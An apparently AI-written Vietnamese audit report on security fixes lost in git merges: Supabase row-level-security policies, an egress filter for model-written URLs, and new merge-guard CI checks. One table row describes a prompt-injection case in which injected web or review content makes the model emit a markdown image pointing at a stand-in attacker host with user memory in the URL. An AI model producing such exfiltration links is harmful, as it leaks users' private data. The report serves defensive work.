# Mất code khi merge — khôi phục bảo mật và audit có hệ thống (2026-09-25)

```
> npm run whoami
  branch   : rc/web-uat
  supabase : zdaprdfgpbpnxyofagmc  ✅ audit/non-prod
  dev port : 3007
```

Chưa deploy, chưa push. Không kết nối DB production. Mọi thay đổi DB chỉ áp lên **audit**, sau PRE-FLIGHT CHECK 2. Mỗi mục một commit. Evidence nằm ở `docs/uat/evidence/merge-loss-2026-09-25/`.

## Tóm tắt

| # | Việc | Kết quả |
|---|---|---|
| 1 | **F-065, P0**: `groups` / `group_members` đọc được bằng anon key | ✅ **Đã sửa** (`be3beba`) và đo live trên audit. Trước khi sửa: anon key đọc được 2/2 nhóm và 2/2 dòng thành viên, gồm cả `dietary_restrictions`. Sau khi sửa: 0/0. Test DB 11/11; khi bỏ migration thì 5 test fail |
| 2 | 7 commit bảo mật 09-03 chưa từng lên nhánh ship | 5 commit đã khôi phục, 1 được khoá lại bằng test, **1 cố ý không đưa lại** (có lý do). Guard SQL G5/G6 cũng được khôi phục, và G5 lập tức bắt thêm 1 policy `USING (true)` (false positive, đã ghi lý do) |
| 3 | Audit mất-code cho **14 merge** trong tháng | Tìm thêm 1 lỗ **P1 quyền riêng tư**: `review_likes` đọc được bằng anon key. Đã sửa (`84e8669`). **1 P1 cần owner quyết** (F-086). 5 mục P2, còn lại P3 hoặc cố ý |
| 4 | Phòng ngừa | Đề xuất một check chạy **trước khi merge vào nhánh ship** (§4). Chưa làm, chờ bạn duyệt |

**Vấn đề hệ thống:** code bị mất theo **ba** cách, không chỉ một:
- **(a) Nhánh không bao giờ được merge.** Công việc 09-03 nằm trên `integration/v3-foundation` → F-065 và 6 commit khác.
- **(b) Người resolve merge gỡ phần git đã merge sạch.** Tôi gọi đây là "evil merge". Ví dụ: a6ca9f0 gỡ dây nối `planJson`; 3cbb10e gỡ sidebar "MY ACCOUNT".
- **(c) Merge cố ý "park" một bộ tính năng**, và bản vá bảo mật bị park theo. Ví dụ: 1e7b77e park "profile v2", kéo theo migration `review_likes_private`.

Cả ba loại đều qua được mọi test, vì test cũng biến mất cùng code.

---

## 1. F-065 (P0): ranh giới đọc nhóm

**Nguồn bản sửa:** `558ba49` trên `integration/v3-foundation`, cherry-pick nguyên văn. Chỉ đổi port của test DB (54375 trùng với `chat_messaging_boundary`).
- Migration `20260904_group_read_boundary.sql`:
  - Bỏ hai policy `SELECT … TO public USING (true)`.
  - Thay bằng policy `TO authenticated` qua `fn_group_participant()` (SECURITY DEFINER, chỉ trả lời về chính người gọi).
  - Quyền EXECUTE của hàm này **chỉ** cấp cho `authenticated`.
- `GET /api/group` (người có link) và phép đếm giới hạn 10 thành viên khi join đọc qua service role, **ghim vào đúng id nhóm**. Nhờ vậy chia sẻ bằng link và giới hạn 10 người vẫn hoạt động.

**Đo live trên audit** bằng PostgREST (`groups-probe-before.json` / `-after.json`). Fixture: `manual.uat.user` tạo nhóm, `manual.uat.pro` là thành viên.

| Người đọc | Trước (nhóm / dòng thành viên / cột nhạy cảm) | Sau |
|---|---|---|
| **Chỉ anon key** | 2 / 2 / 2 | **0 / 0 / 0** |
| User ngoài cuộc (`manual.uat.fresh`) | 2 / 2 / 2 | **0 / 0 / 0** |
| Thành viên (`pro`) | 2 nhóm (kể cả nhóm của người khác) | 1: đúng nhóm của mình |
| Người tạo (`user`) | 2 nhóm | 1: đúng nhóm của mình |

**Test DB:** `supabase/tests/group_read_boundary.test.ts` đạt 11/11. Khi làm rỗng migration: 5 fail (`group_read_boundary-without-migration.log`).

⚠️ **Thứ tự trên production** (DEPLOY-CHECKLIST S1):
- Áp migration **SAU** khi web đã deploy.
- Code cũ đọc bằng quyền người gọi; nếu áp trước, người có link sẽ bị 404 và giới hạn 10 thành viên mất tác dụng.
- Không được để quá vài phút sau deploy, vì trong khoảng đó bảng vẫn mở.

Route join trên dev server :3007 trả 500 do dev server hỏng (xem phần "Cần bạn làm"). Hai dòng thành viên fixture vì vậy được ghi thẳng vào DB audit, có PRE-FLIGHT.

---

## 2. Bảy commit bảo mật của `integration/v3-foundation` (09-03)

**Cách kiểm:** tạo một worktree tạm từ rc, đặt **test gốc** của từng commit vào và chạy trên code rc.
- Kết quả trước khi sửa: `original-v3-security-tests-on-rc-before.log`. **Mọi test gốc đều fail**, trừ `needBrief` (module không tồn tại trên rc).

| Commit | Bảo vệ cái gì | rc có bảo vệ bằng cách khác không? | Khai thác được hôm nay? | Hành động |
|---|---|---|---|---|
| `558ba49` | Nhóm / thành viên nhóm chỉ người tham gia được đọc | **Không**: policy `USING (true)` trên rc và cả prod (snapshot 09-17) | **Có**: chỉ cần anon key public, đo được live | ✅ `be3beba` (§1) |
| `66e4c46` + phần ảnh của `a711181` (P3-F2/F4/F5) | Model chỉ được xuất URL mà nó **được giao** (có trong kết quả tool của lượt này hoặc trong câu trả lời đã phát hành). Ảnh không thuộc hệ thống → alt text. Đích của CTA/plan bị giới hạn | **Không**. rc `validateModelCtaBlock` chặn nút *mạo danh merchant*, nhưng host lạ thì không; comment trong code tự thừa nhận "no other rule here drops them" | **Có, cần prompt injection**: kết quả web/review/caption khiến model viết `![x](https://attacker/…?d=<memory>)`. Web render thành `<img>` (CSP `img-src https:`), Android render gallery → **không cần click** | ✅ `129f6c9`, port vào pipeline hiện tại (chi tiết dưới) |
| `a711181` (P3-F3) | Caption/title của Explore được fence, giới hạn độ dài; category lấy từ tập đóng | **Không**: `contentProcessor.ts` trên rc giống hệt bản trước khi sửa | **Có**: prompt injection vào bộ phân loại + khuếch đại chi phí (caption vài MB × 20 lần/phút) | ✅ `61fe4a9` |
| `a711181` (P3-F1) + `a3c342a` (S-2) | IP người gọi lấy từ header nền tảng, không lấy hop do caller tự viết; giới hạn oracle "email này có tài khoản không" | Vercel tự ghi đè `x-forwarded-for` "to prevent IP spoofing" (vercel.com/docs/headers/request-headers) | **Thấp** trên Vercel. Còn giá trị phòng thủ nhiều lớp + chặn giá trị không hợp lệ vào cột INET | ✅ `932ac2c`. Rule kiến trúc được khôi phục và bắt thêm một chỗ đọc XFF tự chế (trang subscription) |
| `fc115b7` (C-1) | Ngắt kết nối Google Calendar → **thu hồi token tại Google** | **Không**: rc chỉ xoá dòng của mình | Nhỏ: UI Connections đang ẩn; chỉ ảnh hưởng tài khoản đã kết nối trước đó | ✅ `b4a427b` |
| `44d8f32` | Khoá bất biến: khối prompt dựng từ hội thoại mà **không fence** chỉ được in giá trị thuộc bảng đóng | `renderNeedBrief` không có trên rc. Vai trò tương đương là `buildDecisionFrameBlock`: an toàn nhờ thiết kế nhưng **không có test khoá** | Chưa: hiện an toàn; rủi ro là hồi quy âm thầm về sau | ✅ `eea5c12`: test mới đã kiểm bằng đột biến (nới regex quận → 2 fail) |
| `2caff4b` | `/api/chat` không dùng service role (least privilege) | `updateMemory` ghim `user_id` **sau** khi spread patch (memoryService.ts:89–90) | **Không**: chỉ là lớp phòng thủ thêm | ❌ **Không đưa lại** (F-085). Lý do: rc đã thêm một lệnh ghi service-role hợp lệ (`user_events`, role thường không ghi được), nên rule kiến trúc của commit này sẽ fail. Cần quyết định cách ghi `user_events` trước |
| `a3c342a` + `fc115b7` (guard SQL G5/G6) | G5: policy `SELECT … USING (true)` trên bảng dữ liệu cá nhân. G6: migration gỡ RLS của bảng nhạy cảm | Không có trên rc | Là guard phòng ngừa | ✅ `3adc151`. Bỏ migration nhóm → G5 báo `groups` + `group_members`. G5 cũng bắt `chat_settings` (một dòng cấu hình toàn cục, anon đã bị revoke quyền) → đưa vào allowlist kèm lý do |

**Không đưa lại:** các tài liệu `docs/security/V3_*.md` (chỉ mô tả nhánh 09-03, trừ `V3_THREAT_MODEL.md` đi kèm bản sửa nhóm) và các script mutation harness của nhánh cũ.

### Egress (`129f6c9`): port vào đâu và vì sao khác bản gốc

`streamEnrichment.ts` trên rc đã có hai đường mới mà bản 09-03 không có. Nếu đặt lớp chặn đúng chỗ gốc thì vẫn rò. Tôi đặt nó ở các điểm hội tụ:
- **Luồng live:** mọi delta đi qua `emitLive` / `releasableLiveText`, chỉ giữ lại token đang dở. Lượt thường giữ nguyên byte, số frame và nhịp.
- **Phát hành sớm (progressive):** không cắt ngang token; áp cùng quy tắc live. Nhờ vậy phần đã gửi luôn là tiền tố của bản cuối, và lỗi lặp cả câu trả lời (T1) không quay lại.
- **Settle:** lọc toàn bộ văn bản model **trước** khi tách nhánh injector / card. Cách này phủ cả nhánh web-card (`cardOwnsEnrichment` bỏ qua injector) và lượt lập kế hoạch.
- **Allowlist URL:** mọi URL trong khung `a:` thô của lượt này, cộng các câu trả lời đã phát hành (`/api/chat` truyền vào).
- **Đích CTA/plan:** danh sách nền tảng gốc + mọi host trong registry CCP + các search template mà prompt đưa cho model. Danh sách này được **suy ra**, nên thêm merchant mới sẽ không bị xoá nhầm.

**Test:** 32/32 test egress gốc đạt. Có 2 chỉnh sửa, ghi ngay trong file:
- tham số `publishedHistory` ở vị trí 12;
- rule 13 dùng trang khách sạn, vì luật A3.3 của owner bỏ trang *tìm kiếm* Booking độc lập với egress.

Hai test cũ của rc khẳng định một link *bịa* được giữ lại; tôi đổi chúng sang dùng link được tool giao. Toàn bộ web suite: 13.888/0.

⚠️ **Chưa kiểm bằng model thật** vì dev server :3007 hỏng. Việc cần làm sau khi server chạy lại:
- Hỏi đồ ăn / khách sạn / lập kế hoạch và xác nhận link Maps, Booking, nút CTA còn nguyên.
- Chạy lại golden set.

---

## 3. Audit mất code: mọi merge vào nhánh ship trong tháng (từ 2026-08-25)

**Cách làm (có thể lặp lại):** `docs/uat/evidence/merge-loss-2026-09-25/merge_loss_audit.mjs`, chỉ đọc.
1. Với mỗi merge M: `git show --remerge-diff M`, so **kết quả auto-merge dựng lại** với M.
2. Một dòng bị coi là "mất" khi đủ cả ba điều kiện:
   - có trong auto-merge;
   - không còn ở bất cứ đâu trong file của M;
   - do một bên *thêm* so với merge-base.
3. Gắn nhãn vùng:
   - **clean**: git đã merge sạch nhưng người resolve gỡ đi → tín hiệu mạnh nhất;
   - **conflict**: người resolve chọn nửa kia → có thể hợp lệ.
4. Kiểm dòng đó có còn trong **code sống** ở tip không (loại `docs/`, vì các bản park ở đó từng che mất lỗ `review_likes`).

Kết quả: `audit-at-fb6494a/` (trước các sửa hôm nay) và `audit-at-HEAD/`.

Công cụ là heuristic theo dòng: nó **báo dư** khi code được viết lại bằng chữ khác. Vì vậy mọi dòng có ý nghĩa đều được triage thủ công, theo ba nhóm guard / Android / web, và mỗi kết luận đều kèm lệnh `git`.

| Merge | Nội dung | File có mất | Dòng thiếu ở tip (fb6494a → HEAD) | Vùng clean | Kết luận |
|---|---|---|---|---|---|
| `3cbb10e` 09-24 | rc/web-uat → uat/unified | 33 | 217 → 217 | 73 | Phần lớn là cổng `SHOW_MUSIC`, R-3 được thay bằng code mới hơn. **Mất thật:** sidebar MY ACCOUNT (F-090, P2), UI ảnh nhóm (F-089, P2). `api/track` đã được c7604c9 sửa lại |
| `d917c44` 09-18 | G1 growth → rc | 13 | 70 → 70 | 18 | Đều cố ý (có ghi trong message): quota trọn đời, "Public link" chuyển thành một dòng trong share sheet, thêm `trip.com`. `product.ts` chỉ đổi comment |
| `d303a91` 09-18 | phase4 design | 7 | 19 → 19 | 12 | P3: greeting chuyển file, hạn mức chuỗi cứng, artifact `docs/audit` |
| `1e7b77e` 09-18 | cool-vaughan | 36 | **357 → 95** | 338 → 77 | **P1: `review_likes` riêng tư** bị park cùng profile-v2 → ✅ `84e8669`. **F-086 (P1, owner quyết):** khoản ngân sách thành "tổng chi phí". **F-087 (P2):** guard không khí/chất lượng. Phần còn lại là bộ profile-v2 park có chủ đích (26 file, khớp 100% bản `.txt`) |
| `a6ca9f0` 09-18 | v3-canonical (việc chưa commit) | 19 | 414 → 414 | 301 | **P1: dây nối share Android** → ✅ `8e90514` (hôm qua). **F-088 (P2):** 6 bản sửa đồng bộ thẻ mua sắm Android bị bỏ (message nói "CCP versions kept"; phần sửa không đè lên CCP). Còn lại cố ý / thay thế |
| `2dba2e3` 09-18 | integration/v3-canonical | 16 | 219 → 219 | 147 | **F-091 (P2, owner quyết):** bộ sưu tập cá nhân trên web + chuyển `?tab=profile` (message: "NOT merged", OPEN). Test Android được ghim lại có chủ đích |
| `28e1d7d` 09-18 | affiliate cross-platform | 34 | 129 → 129 | 60 | Cố ý: đổi tên kiểu iOS, bỏ side channel `takeLatestPlacesView`. P3 |
| `89e65f7`, `764effd` 09-17 | origin/main → V3 / CCP | 7 / 3 | 60 / 26 | 0 / 0 | Chỉ nửa conflict, đều có bản mới hơn (`parsePlan` chuyển file, `promptGender`). P3 |
| `997f55c` 09-10 | phase4 design | 12 | 191 → 191 | 126 | Serializer `[TAPPY_PLACES]` thứ hai bị gỡ **có chủ đích** (marker.ts là nguồn duy nhất); `placesGroundedInProse` vẫn còn. Test được viết lại. P3 |
| `842379b`, `6c6450f`, `328954a`, `b85ddd9` | PR #248–#251 vào main | 0 | 0 | 0 | Sạch |

### Danh sách mất mát, đã xếp theo mức độ

| Mức | Mất gì | Ở merge nào | Tình trạng |
|---|---|---|---|
| **P0** | Ranh giới đọc nhóm (loại a) | chưa từng merge | ✅ `be3beba` |
| **P1** | `review_likes` public (lịch sử like của bất kỳ ai) | `1e7b77e` (loại c) | ✅ `84e8669`, đo live |
| **P1** | Chặn egress URL/ảnh do model viết (loại a) | chưa từng merge | ✅ `129f6c9` |
| **P1** | Dây nối share kế hoạch / địa điểm trên Android | `a6ca9f0` (loại b) | ✅ `8e90514` |
| **P1 · owner quyết** | Guard "ngân sách thành tổng chi phí" trong văn xuôi (F-086) | `1e7b77e` (cố ý: mâu thuẫn hợp đồng G2 bạn đã duyệt) | ⏸ Không tự sửa. Phải chọn một trong hai: (a) khôi phục `COST_FRAME_RE` ở **cả hai** chỗ miễn trừ và sửa lỗi xoá mất "Với" (F-092) trước; hoặc (b) chấp nhận và xoá test F/H |
| P2 · owner quyết | Guard "không gian / chất lượng" (F-087) | `1e7b77e` | Rule 6 dòng; triage đã thử khôi phục, cả suite vẫn xanh trừ F/H |
| P2 | Đồng bộ thẻ mua sắm Android (F-088) | `a6ca9f0` | Liệt kê; nguồn port `6829f6b` |
| P2 · owner quyết | UI ảnh nhóm (F-089) | `3cbb10e` | Backend có, UI không; migration vẫn là blocker khi deploy |
| P2 | Sidebar MY ACCOUNT (F-090) | `3cbb10e` (loại b) | Thay đổi UI → cần bạn duyệt |
| P2 · owner quyết | Bộ sưu tập cá nhân trên web (F-091) | `2dba2e3` | Mục OPEN có sẵn |
| P3 | Lỗi xoá mất từ đầu câu sau "Với" (F-092); test profile-v2 park; đổi tên iOS; artifact | nhiều | Liệt kê |

### Nhánh chưa bao giờ merge (loại a), quét thêm

Tôi quét 241 commit không có trên rc (`branch-containment-2026-09-24.txt`) theo từ khoá bảo mật:
- `8dfec64` (wtandroid, "khách ẩn danh không được tạo việc trả phí định kỳ"): rc **đã có** bảo vệ tương đương (`refuseAnonymousSocialWrite` trong `price-watch/route.ts`).
- `phase8-master` (Task 01 security, Task 12 quota): tách riêng có chủ đích, không thuộc bản này.
- Không có commit bảo mật chưa merge nào khác.

### Giới hạn

- Audit chỉ phủ **merge commit**. Các lần tích hợp bằng cách **copy file** (ví dụ "47 trên 115 file của 9f85cde" ở b496f4a) không phải merge, nên không nằm trong phạm vi. Sidebar MY ACCOUNT được phát hiện chỉ vì 3cbb10e merge lại nó.
- So sánh theo dòng: đổi tên, dời chỗ hay viết lại bằng chữ khác sẽ bị báo là "mất". Vì thế mọi dòng P1/P2 đều được kiểm bằng tay.

---

## 4b. ĐÃ LÀM (owner duyệt 2026-09-25): hai check, chạy local và CI

| Check | Chặn gì | Local | CI |
|---|---|---|---|
| `scripts/merge-guard/merge-guard.mjs` | R1: gỡ dòng mà git đã merge sạch. R2: xoá file mà một bên đã thêm. R3: bỏ nửa conflict ở đường dẫn được bảo vệ. Chỉ bỏ qua được bằng trailer `Merge-Drop: <path> — <lý do>` | `npm run merge:guard -- --staged` (khi merge đang dở, trước khi commit)<br>`npm run merge:guard -- --range origin/main..HEAD`<br>Hook tuỳ chọn: `scripts/merge-guard/pre-merge-commit` | `.github/workflows/merge-guard.yml`, job `merge-guard`: mọi PR và mọi push lên `main` / `rc/**` / `release/**` |
| `scripts/merge-guard/branch-containment.mjs` | Commit không phải merge, chạm migration / test DB / security / auth / RLS / quota / payment / guard, **cũ hơn N ngày** (mặc định 7) mà chưa về nhánh ship. "Đã về" nghĩa là cùng patch-id, hoặc ≥60% dòng thêm có mặt, nên bắt được cả cherry-pick có sửa. Ngoại lệ ghi trong `containment-allow.json`, kèm lý do và hạn | `npm run merge:containment -- --ship origin/main` | Job `branch-containment`: mỗi push, PR, và mỗi đêm (cron) |

Nhánh ship trên CI đọc từ biến repo `SHIP_BRANCH` (mặc định `main`; hiện nên đặt là `rc/web-uat`), N đọc từ `CONTAINMENT_DAYS`.

**Chứng minh trên ca thật** (`docs/uat/evidence/merge-guard-2026-09-25/`):

| Ca | Lệnh | Kết quả |
|---|---|---|
| a6ca9f0 | `merge-guard --commit a6ca9f0` | ✖ exit 1: **R1** `android/…/chat/ChatScreen.kt`, dòng `TripPlanCard(plan, planJson = message.planJson)` bị gỡ ở vùng merge sạch (`a6ca9f0.txt`) |
| 1e7b77e | `merge-guard --commit 1e7b77e` | ✖ exit 1: **R2 [protected]** `supabase/migrations/20260915b_review_likes_private.sql` và `supabase/tests/review_likes_private.test.ts`, "file added by parent 2 is deleted" (`1e7b77e.txt`) |
| F-065 (`integration/v3-foundation`) | `branch-containment --ship fb6494a --now 2026-09-24` (tái hiện nhánh ship trước khi sửa) | ✖ exit 1: `558ba49` (20 ngày), `supabase/migrations/20260904_group_read_boundary.sql` "file absent on ship" (`containment-f065-at-fb6494a.txt`) |
| F-065 sau khi sửa | cùng lệnh, `--ship HEAD` | `558ba49`, `a3c342a`, `fc115b7` **không còn bị báo** (đã về). Các mục còn lại là text đã viết lại, needBrief (N/A) và 2caff4b (hoãn), ghi trong allowlist đến 2026-10-31 |
| Đối chứng âm | `merge-guard --commit 842379b` (PR #251) | ✓ exit 0 |

**Toàn bộ 14 merge trong tháng:**
- 6 merge PR/main sạch.
- 8 merge tích hợp bị bắt (`all-merges-summary.txt`). Lẽ ra mỗi merge này phải khai `Merge-Drop` cho phần nó bỏ.

**Test tự động:** `scripts/merge-guard/mergeGuard.test.ts`, 9/9, dùng repo git tổng hợp. Mỗi quy tắc có ca fail và ca pass. Test phủ `--staged`, trailer, allow đã hết hạn, và cherry-pick có sửa.

**Lần quét containment đầu tiên** trên mọi nhánh (2 phút 9 giây): 26 commit duy nhất, trên 44 nhánh (`containment-all-at-HEAD-by-commit.txt`).
- Mục thật mới: **F-093** (`6964bfb`, khoá ngoại `user_memory.user_id` + migration + test DB, 13 ngày, P2).
- `2fa8bb2` (returnTo): **đã có** bảo vệ tương đương trên rc.
- Phần còn lại là snapshot `wip/*`, controller-v2, business-p0, phase6 và nhánh Android/iOS cũ. **Bạn cần triage**, vì CI sẽ đỏ cho tới khi mỗi nhánh được merge hoặc ghi vào allowlist kèm lý do.

## Quyết định của owner (2026-09-25), đã ghi vào findings.json

- **F-086: khôi phục** → ✅ `2ce8402`, làm sau khi sửa **F-092** ✅ `e30bdc3`. Golden set: chạy lại khi :3007 hoạt động.
- **F-085: hoãn tới sau launch.** Không đụng service role của `/api/chat`.
- **F-087, F-088, F-089, F-090, F-091: hoãn tới sau launch.** Riêng migration `20260922_groups_avatar_url` vẫn là blocker khi deploy.

## 4. Phòng ngừa: đề xuất ban đầu (đã được duyệt; bản đã làm ở §4b)

**`merge-guard`:** một script (dùng cùng thuật toán `merge_loss_audit.mjs`), chạy ở hai chỗ:
- local, qua `npm run merge:guard` sau `git merge --no-commit` (so **index** với `git merge-tree --write-tree P1 P2`);
- CI, cho mọi merge commit trong khoảng `origin/<ship>..HEAD`, trước khi đẩy lên nhánh ship.

**Check FAIL khi merge:**
1. **Gỡ một dòng mà git đã merge sạch** (vùng clean), ở bất kỳ file code nào.
2. **Xoá nguyên một file mà một bên đã thêm.**
3. Bỏ **nửa conflict** của một bên trong đường dẫn được bảo vệ: `supabase/migrations/**`, `supabase/tests/**`, `src/lib/security/**`, `src/lib/auth/**`, rate-limit/quota, `**/*Guard.ts`, `streamEnrichment.ts`, route thanh toán / commerce.

Cách vượt duy nhất: ghi rõ **trailer trong message của merge**, mỗi file một dòng: `Merge-Drop: <path> — <lý do>`. Kết quả là việc "park" vẫn làm được, nhưng phải khai báo từng file, và reviewer nhìn thấy ngay "migration bảo mật này bị bỏ".

**Lẽ ra nó đã bắt được gì:**
- `a6ca9f0`: `planJson` bị gỡ ở vùng clean → quy tắc 1.
- `1e7b77e`: xoá `20260915b_review_likes_private.sql` và test DB → quy tắc 2 + 3. Message có nói "profile v2 parked", nhưng không nêu tên migration bảo mật.
- `3cbb10e`: sidebar MY ACCOUNT ở vùng clean → quy tắc 1.

**Không bắt được:** loại (a), nhánh không bao giờ merge (F-065). Loại đó cần một check "nhánh chứa gì" riêng, ví dụ chạy `git cherry` với các nhánh security. Tôi không đưa vào đây, vì bạn yêu cầu **một** check.

---

## Health check (sau các commit hôm nay, HEAD `84e8669` + commit báo cáo này)

| Kiểm tra | Kết quả |
|---|---|
| `tsc --noEmit` | ✅ 0 lỗi |
| `next lint` | ✅ 0 lỗi, 42 cảnh báo (có từ trước) |
| Kiến trúc `check.mjs` | ✅ 15/15 rule (trong đó `no-adhoc-forwarded-ip` vừa được khôi phục) |
| Guard SQL `check-sql-grants.mjs` | ✅ 0 lỗi (G1–G6) |
| Web `vitest --project app` | ✅ **13.894 pass**, 0 fail, 69 skip |
| DB `vitest --project db` | ✅ **869/869**, 34 suite (thêm `group_read_boundary` và `review_likes_private`) |
| Android | Không có thay đổi Android trong đợt này; lần gần nhất 787/0 |
| Build production | ⚪ **Không chạy lại.** Chạy trong worktree này sẽ ghi đè `.next` của dev server; build ở worktree riêng thì phải copy env, và bước đó đã bị chặn |

## Cần bạn làm

1. **Dev server :3007 vẫn hỏng.**
   - Nguyên nhân: tiến trình node mồ côi PID 29744 vẫn đang giữ port, và `.next` đã bị bản build production ghi đè; lệnh dừng tiến trình của tôi bị chặn.
   - Cần: dừng PID 29744 → `npm run dev`. Sau đó tôi kiểm egress bằng model thật và kiểm route join nhóm.
2. **Quyết F-086** (ngân sách thành tổng chi phí), **F-087**, **F-089**, **F-091**, và cách ghi `user_events` (điều kiện để đưa lại 2caff4b).
3. **Production:** thêm hai bước vào DEPLOY-CHECKLIST: **L1** `review_likes_private` (ngay **trước** deploy) và **S1** `group_read_boundary` (ngay **sau** deploy).
4. **Duyệt đề xuất §4** thì tôi mới làm.
